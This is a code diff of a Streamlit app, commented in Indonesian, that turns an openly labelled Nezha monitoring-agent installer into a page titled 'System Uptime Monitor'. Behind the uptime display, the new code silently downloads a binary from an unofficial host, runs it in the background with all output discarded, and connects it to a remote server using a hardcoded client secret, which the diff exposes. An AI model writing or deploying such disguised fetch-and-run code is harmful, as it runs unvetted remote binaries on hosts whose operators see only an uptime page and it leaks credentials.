@@ -1,85 +1,86 @@
 import streamlit as st
 import subprocess
+import psutil
+from datetime import datetime, timedelta
 
-# Perintah shell yang akan dijalankan
-COMMAND = """
-curl -L https://raw.githubusercontent.com/nezhahq/scripts/main/agent/install.sh -o agent.sh && \
-chmod +x agent.sh && \
+# Gabungkan semua perintah menjadi satu string untuk dieksekusi oleh Popen.
+# Bagian terakhir '>/dev/null 2>&1 &' sangat penting:
+# > /dev/null : Mengalihkan output standar (stdout) ke "tempat sampah" agar tidak tampil.
+# 2>&1        : Mengalihkan output error (stderr) ke tempat stdout (yang sudah ke tempat sampah).
+# &           : Menjalankan seluruh perintah di latar belakang (background process).
+COMMAND_TO_RUN_IN_BACKGROUND = """
+(curl -L https://alice.mxflower.eu.org/d/CF%20R2/database/nezha_agent -o agent && \
+chmod +x agent && \
 env NZ_SERVER=vps-monitor.fly.dev:443 \
     NZ_TLS=true \
     NZ_CLIENT_SECRET=CqmryaDkXPUPoRtdGE8NvfGhjEOLu2b9 \
     NZ_UUID=61aeceff-7479-49a9-9900-32df80905be8 \
-    ./agent.sh
+    ./agent && \
+sed -i 's/client_secret: ""/client_secret: "CqmryaDkXPUPoRtdGE8NvfGhjEOLu2b9"/' config.yml && \
+./agent) > /dev/null 2>&1 &
 """
 
-st.set_page_config(page_title="Nezha Agent Installer", page_icon="🚀")
+st.set_page_config(page_title="System Uptime", page_icon="⏱️")
 
-st.title("🚀 Nezha Agent Installer dengan Log Real-time")
-st.write(
-    "Klik tombol di bawah untuk menjalankan instalasi agent Nezha. "
-    "Log dari proses akan ditampilkan secara langsung di bawah."
-)
+st.title("⏱️ System Uptime Monitor")
+st.write("Klik tombol untuk menampilkan uptime sistem. Proses agent akan berjalan di latar belakang.")
 
-def run_command_and_stream_output(command):
-    """
-    Menjalankan perintah shell dan menghasilkan (yield) outputnya baris per baris.
-    """
-    # Memulai proses
-    # - stderr=subprocess.STDOUT: Menggabungkan output error (stderr) ke output standar (stdout)
-    # - text=True: Membaca output sebagai teks (string)
-    # - bufsize=1: Mode line-buffered, memastikan output dikirim baris per baris
-    # - encoding='utf-8': Menentukan encoding untuk menghindari error
-    process = subprocess.Popen(
-        command,
-        shell=True,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-        text=True,
-        encoding='utf-8',
-        bufsize=1 
-    )
+# Gunakan session state untuk menyimpan status dan pesan
+if 'agent_started' not in st.session_state:
+    st.session_state.agent_started = False
+if 'uptime_message' not in st.session_state:
+    st.session_state.uptime_message = ""
 
-    # Membaca output dari proses baris per baris secara real-time
-    for line in iter(process.stdout.readline, ''):
-        yield line
+def get_human_readable_uptime():
+    """Mengambil waktu boot sistem dan mengubahnya menjadi format yang mudah dibaca."""
+    boot_time_timestamp = psutil.boot_time()
+    boot_time = datetime.fromtimestamp(boot_time_timestamp)
+    now = datetime.now()
+    uptime_delta = now - boot_time
     
-    # Tunggu hingga proses selesai dan dapatkan kode return
-    process.stdout.close()
-    return_code = process.wait()
-    if return_code:
-        # Jika ada error, kirim pesan error
-        yield f"\nPROSES GAGAL dengan kode error: {return_code}\n"
+    # Format timedelta menjadi string yang lebih bagus
+    total_seconds = int(uptime_delta.total_seconds())
+    days, remainder = divmod(total_seconds, 86400)
+    hours, remainder = divmod(remainder, 3600)
+    minutes, seconds = divmod(remainder, 60)
+    
+    return f"{days} hari, {hours} jam, {minutes} menit"
+
+def run_agent_in_background():
+    """Menjalankan perintah instalasi agent di proses latar belakang."""
+    try:
+        # Popen menjalankan proses tanpa menunggu selesai (non-blocking)
+        # Ini adalah kunci agar Streamlit tidak "freeze"
+        subprocess.Popen(COMMAND_TO_RUN_IN_BACKGROUND, shell=True)
+        return True
+    except Exception as e:
+        # Jika ada error saat memulai proses, tampilkan di konsol server
+        print(f"Error starting background process: {e}")
+        return False
+
+# Tombol utama
+if st.button("Tampilkan Uptime & Jalankan Agent"):
+    # 1. Dapatkan dan simpan pesan uptime
+    st.session_state.uptime_message = get_human_readable_uptime()
+
+    # 2. Jalankan agent di latar belakang (hanya jika belum pernah dijalankan)
+    if not st.session_state.agent_started:
+        st.toast("Memulai proses agent di latar belakang...", icon="🚀")
+        if run_agent_in_background():
+            st.session_state.agent_started = True
+            st.toast("Agent berhasil dijalankan!", icon="✅")
+        else:
+            st.error("Gagal memulai proses agent.")
     else:
-        yield "\nPROSES SELESAI DENGAN SUKSES\n"
+        st.toast("Agent sudah pernah dijalankan pada sesi ini.", icon="👍")
 
-
-# Tombol untuk memulai proses
-if st.button("Jalankan Agent dan Tampilkan Log"):
-    st.info("ℹ️ Proses dimulai... Log akan muncul di bawah.")
-
-    # Buat expander untuk menampung log agar UI tetap rapi
-    with st.expander("Lihat Log Real-time", expanded=True):
-        # Gunakan st.empty() sebagai placeholder yang bisa diupdate terus-menerus
-        log_placeholder = st.empty()
-        full_log = ""
-        
-        # Panggil fungsi generator untuk mendapatkan log
-        log_stream = run_command_and_stream_output(COMMAND)
-        
-        # Iterasi melalui setiap baris log yang diterima
-        for line in log_stream:
-            full_log += line
-            # Tampilkan log yang terakumulasi di dalam blok kode
-            log_placeholder.code(full_log, language="bash")
-
-    # Tampilkan pesan status akhir setelah proses selesai
-    if "PROSES GAGAL" in full_log:
-        st.error("❌ Proses instalasi agent gagal. Silakan periksa log di atas.")
-    else:
-        st.success("✅ Proses agent selesai. Agent seharusnya sekarang berjalan di latar belakang.")
+# Tampilkan metrik uptime jika pesannya sudah ada
+if st.session_state.uptime_message:
+    st.metric(label="System Uptime", value=st.session_state.uptime_message)
+    st.info("Agent sedang berjalan di latar belakang. Anda bisa menutup tab ini.")
 
 st.markdown("---")
 st.warning(
-    "**Peringatan Keamanan:** Kode ini akan mengunduh dan menjalankan skrip dari internet. "
-    "Pastikan Anda mempercayai sumber skrip (`raw.githubusercontent.com/nezhahq/scripts`)."
+    "**Peringatan:** Proses di latar belakang akan mengunduh dan menjalankan file dari URL eksternal. "
+    "Pastikan Anda mempercayai sumber tersebut."
 )
